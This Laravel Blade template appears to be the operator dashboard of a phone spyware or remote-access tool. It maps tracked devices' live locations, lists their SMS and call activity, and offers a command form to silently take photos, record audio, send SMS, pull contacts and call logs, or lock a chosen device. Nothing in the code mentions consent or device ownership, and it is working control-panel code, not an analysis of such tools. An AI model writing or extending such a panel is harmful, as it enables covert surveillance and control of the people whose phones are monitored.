@extends('layouts.app')

@section('title', 'Dashboard')

@section('content')
<div class="container-fluid">
    <!-- Page Header -->
    <div class="row mb-4">
        <div class="col-12">
            <div class="d-flex justify-content-between align-items-center">
                <h1 class="h3 mb-0 text-gray-800">Dashboard</h1>
                <div class="d-flex">
                    <button class="btn btn-primary me-2" onclick="refreshDashboard()">
                        <i class="fas fa-sync-alt"></i> Refresh
                    </button>
                    <button class="btn btn-success" onclick="sendGlobalCommand()">
                        <i class="fas fa-broadcast-tower"></i> Send Command
                    </button>
                </div>
            </div>
        </div>
    </div>

    <!-- Statistics Cards -->
    <div class="row mb-4">
        <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-primary shadow h-100 py-2">
                <div class="card-body">
                    <div class="row no-gutters align-items-center">
                        <div class="col mr-2">
                            <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">
                                Total Devices</div>
                            <div class="h5 mb-0 font-weight-bold text-gray-800">{{ $deviceStats['total'] }}</div>
                        </div>
                        <div class="col-auto">
                            <i class="fas fa-mobile-alt fa-2x text-gray-300"></i>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-success shadow h-100 py-2">
                <div class="card-body">
                    <div class="row no-gutters align-items-center">
                        <div class="col mr-2">
                            <div class="text-xs font-weight-bold text-success text-uppercase mb-1">
                                Online Devices</div>
                            <div class="h5 mb-0 font-weight-bold text-gray-800">{{ $deviceStats['online'] }}</div>
                        </div>
                        <div class="col-auto">
                            <i class="fas fa-wifi fa-2x text-gray-300"></i>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-warning shadow h-100 py-2">
                <div class="card-body">
                    <div class="row no-gutters align-items-center">
                        <div class="col mr-2">
                            <div class="text-xs font-weight-bold text-warning text-uppercase mb-1">
                                Offline Devices</div>
                            <div class="h5 mb-0 font-weight-bold text-gray-800">{{ $deviceStats['offline'] }}</div>
                        </div>
                        <div class="col-auto">
                            <i class="fas fa-exclamation-triangle fa-2x text-gray-300"></i>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="col-xl-3 col-md-6 mb-4">
            <div class="card border-left-info shadow h-100 py-2">
                <div class="card-body">
                    <div class="row no-gutters align-items-center">
                        <div class="col mr-2">
                            <div class="text-xs font-weight-bold text-info text-uppercase mb-1">
                                New (24h)</div>
                            <div class="h5 mb-0 font-weight-bold text-gray-800">{{ $deviceStats['last_24h'] }}</div>
                        </div>
                        <div class="col-auto">
                            <i class="fas fa-clock fa-2x text-gray-300"></i>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Main Content Row -->
    <div class="row">
        <!-- Live Devices Map -->
        <div class="col-xl-8 col-lg-7">
            <div class="card shadow mb-4">
                <div class="card-header py-3 d-flex flex-row align-items-center justify-content-between">
                    <h6 class="m-0 font-weight-bold text-primary">Live Device Locations</h6>
                    <div class="dropdown no-arrow">
                        <a class="dropdown-toggle" href="#" role="button" id="dropdownMenuLink"
                            data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                            <i class="fas fa-ellipsis-v fa-sm fa-fw text-gray-400"></i>
                        </a>
                        <div class="dropdown-menu dropdown-menu-right shadow animated--fade-in"
                            aria-labelledby="dropdownMenuLink">
                            <div class="dropdown-header">Map Options:</div>
                            <a class="dropdown-item" href="#" onclick="refreshMap()">Refresh Locations</a>
                            <a class="dropdown-item" href="#" onclick="centerMap()">Center Map</a>
                        </div>
                    </div>
                </div>
                <div class="card-body">
                    <div id="map" style="height: 400px; width: 100%;"></div>
                </div>
            </div>
        </div>

        <!-- Recent Activities -->
        <div class="col-xl-4 col-lg-5">
            <div class="card shadow mb-4">
                <div class="card-header py-3">
                    <h6 class="m-0 font-weight-bold text-primary">Recent Activities</h6>
                </div>
                <div class="card-body" style="max-height: 400px; overflow-y: auto;">
                    @forelse($recentActivities as $activity)
                    <div class="d-flex align-items-center mb-3">
                        <div class="mr-3">
                            @if($activity['type'] == 'sms')
                                <i class="fas fa-sms text-info fa-2x"></i>
                            @elseif($activity['type'] == 'call')
                                <i class="fas fa-phone text-success fa-2x"></i>
                            @else
                                <i class="fas fa-info-circle text-secondary fa-2x"></i>
                            @endif
                        </div>
                        <div class="flex-grow-1">
                            <div class="small text-gray-500">{{ date('M j, H:i', $activity['timestamp'] / 1000) }}</div>
                            <div class="font-weight-bold">{{ $activity['title'] }}</div>
                            <div class="small">{{ $activity['description'] }}</div>
                            <div class="small text-muted">Device: {{ substr($activity['device_id'], 0, 8) }}...</div>
                        </div>
                    </div>
                    @empty
                    <div class="text-center text-muted">
                        <i class="fas fa-inbox fa-3x mb-3"></i>
                        <p>No recent activities</p>
                    </div>
                    @endforelse
                </div>
            </div>
        </div>
    </div>

    <!-- Live Devices Table -->
    <div class="row">
        <div class="col-12">
            <div class="card shadow mb-4">
                <div class="card-header py-3">
                    <h6 class="m-0 font-weight-bold text-primary">Live Devices</h6>
                </div>
                <div class="card-body">
                    <div class="table-responsive">
                        <table class="table table-bordered" id="devicesTable" width="100%" cellspacing="0">
                            <thead>
                                <tr>
                                    <th>Device ID</th>
                                    <th>Status</th>
                                    <th>Last Seen</th>
                                    <th>App Version</th>
                                    <th>FCM Token</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                @foreach($liveDevices as $device)
                                <tr>
                                    <td>
                                        <code>{{ substr($device['device_id'], 0, 12) }}...</code>
                                    </td>
                                    <td>
                                        @if($device['status'] == 'online')
                                            <span class="badge badge-success">Online</span>
                                        @else
                                            <span class="badge badge-secondary">Offline</span>
                                        @endif
                                    </td>
                                    <td>
                                        @if($device['last_seen'])
                                            {{ date('M j, Y H:i', $device['last_seen'] / 1000) }}
                                        @else
                                            Never
                                        @endif
                                    </td>
                                    <td>{{ $device['app_version'] }}</td>
                                    <td>
                                        @if($device['fcm_token'])
                                            <i class="fas fa-check text-success"></i> Available
                                        @else
                                            <i class="fas fa-times text-danger"></i> Not Available
                                        @endif
                                    </td>
                                    <td>
                                        <div class="btn-group" role="group">
                                            <button type="button" class="btn btn-sm btn-info" 
                                                    onclick="viewDevice('{{ $device['device_id'] }}')">
                                                <i class="fas fa-eye"></i>
                                            </button>
                                            <button type="button" class="btn btn-sm btn-warning" 
                                                    onclick="sendDeviceCommand('{{ $device['device_id'] }}')">
                                                <i class="fas fa-terminal"></i>
                                            </button>
                                            <button type="button" class="btn btn-sm btn-success" 
                                                    onclick="locateDevice('{{ $device['device_id'] }}')">
                                                <i class="fas fa-map-marker-alt"></i>
                                            </button>
                                        </div>
                                    </td>
                                </tr>
                                @endforeach
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Device Details Modal -->
<div class="modal fade" id="deviceModal" tabindex="-1" role="dialog">
    <div class="modal-dialog modal-lg" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Device Details</h5>
                <button type="button" class="close" data-dismiss="modal">
                    <span>&times;</span>
                </button>
            </div>
            <div class="modal-body" id="deviceModalContent">
                <div class="text-center">
                    <div class="spinner-border" role="status">
                        <span class="sr-only">Loading...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Command Modal -->
<div class="modal fade" id="commandModal" tabindex="-1" role="dialog">
    <div class="modal-dialog" role="document">
        <div class="modal-content">
            <div class="modal-header">
                <h5 class="modal-title">Send Command</h5>
                <button type="button" class="close" data-dismiss="modal">
                    <span>&times;</span>
                </button>
            </div>
            <div class="modal-body">
                <form id="commandForm">
                    <input type="hidden" id="commandDeviceId" name="device_id">
                    <div class="form-group">
                        <label for="commandType">Command Type</label>
                        <select class="form-control" id="commandType" name="command" required>
                            <option value="">Select Command</option>
                            <option value="get_location">Get Current Location</option>
                            <option value="take_photo">Take Photo</option>
                            <option value="record_audio">Record Audio</option>
                            <option value="send_sms">Send SMS</option>
                            <option value="get_contacts">Get Contacts</option>
                            <option value="get_call_log">Get Call Log</option>
                            <option value="lock_device">Lock Device</option>
                        </select>
                    </div>
                    <div id="commandParameters"></div>
                </form>
            </div>
            <div class="modal-footer">
                <button type="button" class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                <button type="button" class="btn btn-primary" onclick="executeCommand()">Send Command</button>
            </div>
        </div>
    </div>
</div>
@endsection

@section('scripts')
<script src="https://maps.googleapis.com/maps/api/js?key=YOUR_GOOGLE_MAPS_API_KEY&libraries=geometry"></script>
<script>
let map;
let markers = [];

// Initialize map
function initMap() {
    map = new google.maps.Map(document.getElementById('map'), {
        zoom: 10,
        center: { lat: 40.7128, lng: -74.0060 }, // Default to NYC
        styles: [
            // Add custom map styling here
        ]
    });
    
    loadDeviceLocations();
}

// Load device locations on map
function loadDeviceLocations() {
    @foreach($liveDevices as $device)
        @if($device['status'] == 'online')
            // Get current location for online devices
            fetch(`/dashboard/device/{{ $device['device_id'] }}/location`)
                .then(response => response.json())
                .then(data => {
                    if (data.location && data.location.latitude && data.location.longitude) {
                        addDeviceMarker(
                            '{{ $device['device_id'] }}',
                            data.location.latitude,
                            data.location.longitude
                        );
                    }
                })
                .catch(error => console.error('Error loading location:', error));
        @endif
    @endforeach
}

// Add device marker to map
function addDeviceMarker(deviceId, lat, lng) {
    const marker = new google.maps.Marker({
        position: { lat: parseFloat(lat), lng: parseFloat(lng) },
        map: map,
        title: `Device: ${deviceId.substring(0, 8)}...`,
        icon: {
            url: 'data:image/svg+xml;charset=UTF-8,' + encodeURIComponent(`
                <svg width="30" height="30" viewBox="0 0 30 30" xmlns="http://www.w3.org/2000/svg">
                    <circle cx="15" cy="15" r="10" fill="#4CAF50" stroke="#fff" stroke-width="2"/>
                    <text x="15" y="19" text-anchor="middle" fill="white" font-size="12">📱</text>
                </svg>
            `),
            scaledSize: new google.maps.Size(30, 30)
        }
    });
    
    // Add click listener
    marker.addListener('click', () => {
        viewDevice(deviceId);
    });
    
    markers.push(marker);
}

// View device details
function viewDevice(deviceId) {
    $('#deviceModalContent').html(`
        <div class="text-center">
            <div class="spinner-border" role="status">
                <span class="sr-only">Loading...</span>
            </div>
        </div>
    `);
    
    $('#deviceModal').modal('show');
    
    fetch(`/dashboard/device/${deviceId}/details`)
        .then(response => response.json())
        .then(data => {
            let content = `
                <div class="row">
                    <div class="col-md-6">
                        <h6>Device Information</h6>
                        <table class="table table-sm">
                            <tr><td>Device ID:</td><td><code>${deviceId}</code></td></tr>
                            <tr><td>Status:</td><td><span class="badge badge-${data.device.status === 'online' ? 'success' : 'secondary'}">${data.device.status}</span></td></tr>
                            <tr><td>Last Seen:</td><td>${new Date(data.device.lastSeen).toLocaleString()}</td></tr>
                            <tr><td>App Version:</td><td>${data.device.appVersion || 'Unknown'}</td></tr>
                        </table>
                    </div>
                    <div class="col-md-6">
                        <h6>Current Location</h6>
                        ${data.location ? `
                            <table class="table table-sm">
                                <tr><td>Latitude:</td><td>${data.location.latitude}</td></tr>
                                <tr><td>Longitude:</td><td>${data.location.longitude}</td></tr>
                                <tr><td>Accuracy:</td><td>${data.location.accuracy}m</td></tr>
                                <tr><td>Timestamp:</td><td>${new Date(data.location.timestamp).toLocaleString()}</td></tr>
                            </table>
                        ` : '<p class="text-muted">No location data available</p>'}
                    </div>
                </div>
                
                <hr>
                
                <h6>Recent Activities</h6>
                <div style="max-height: 200px; overflow-y: auto;">
                    ${data.activities.length > 0 ? data.activities.map(activity => `
                        <div class="d-flex align-items-center mb-2">
                            <div class="mr-2">
                                <i class="fas fa-${activity.type === 'sms' ? 'sms' : 'phone'} text-info"></i>
                            </div>
                            <div>
                                <small class="text-muted">${new Date(activity.timestamp).toLocaleString()}</small><br>
                                <strong>${activity.type.toUpperCase()}</strong>
                                ${activity.data.phone_number ? ` - ${activity.data.phone_number}` : ''}
                            </div>
                        </div>
                    `).join('') : '<p class="text-muted">No recent activities</p>'}
                </div>
            `;
            
            $('#deviceModalContent').html(content);
        })
        .catch(error => {
            $('#deviceModalContent').html(`
                <div class="alert alert-danger">
                    <i class="fas fa-exclamation-triangle"></i>
                    Failed to load device details: ${error.message}
                </div>
            `);
        });
}

// Send command to device
function sendDeviceCommand(deviceId) {
    $('#commandDeviceId').val(deviceId);
    $('#commandForm')[0].reset();
    $('#commandParameters').empty();
    $('#commandModal').modal('show');
}

// Handle command type change
$('#commandType').change(function() {
    const command = $(this).val();
    const parametersDiv = $('#commandParameters');
    parametersDiv.empty();
    
    switch(command) {
        case 'send_sms':
            parametersDiv.html(`
                <div class="form-group">
                    <label for="smsNumber">Phone Number</label>
                    <input type="text" class="form-control" id="smsNumber" name="phone_number" required>
                </div>
                <div class="form-group">
                    <label for="smsMessage">Message</label>
                    <textarea class="form-control" id="smsMessage" name="message" required></textarea>
                </div>
            `);
            break;
        case 'record_audio':
            parametersDiv.html(`
                <div class="form-group">
                    <label for="recordDuration">Duration (seconds)</label>
                    <input type="number" class="form-control" id="recordDuration" name="duration" value="10" min="1" max="60">
                </div>
            `);
            break;
        case 'take_photo':
            parametersDiv.html(`
                <div class="form-group">
                    <label for="cameraType">Camera</label>
                    <select class="form-control" id="cameraType" name="camera">
                        <option value="back">Back Camera</option>
                        <option value="front">Front Camera</option>
                    </select>
                </div>
            `);
            break;
    }
});

// Execute command
function executeCommand() {
    const formData = new FormData($('#commandForm')[0]);
    const parameters = {};
    
    // Collect parameters
    $('#commandParameters input, #commandParameters select, #commandParameters textarea').each(function() {
        if ($(this).attr('name') && $(this).val()) {
            parameters[$(this).attr('name')] = $(this).val();
        }
    });
    
    const data = {
        device_id: formData.get('device_id'),
        command: formData.get('command'),
        parameters: parameters,
        _token: $('meta[name="csrf-token"]').attr('content')
    };
    
    fetch('/dashboard/send-command', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'X-CSRF-TOKEN': $('meta[name="csrf-token"]').attr('content')
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        if (data.success) {
            $('#commandModal').modal('hide');
            alert('Command sent successfully!');
        } else {
            alert('Failed to send command: ' + data.message);
        }
    })
    .catch(error => {
        alert('Error sending command: ' + error.message);
    });
}

// Refresh dashboard
function refreshDashboard() {
    location.reload();
}

// Initialize map when page loads
$(document).ready(function() {
    initMap();
    
    // Auto-refresh every 30 seconds
    setInterval(function() {
        loadDeviceLocations();
    }, 30000);
});
</script>
@endsection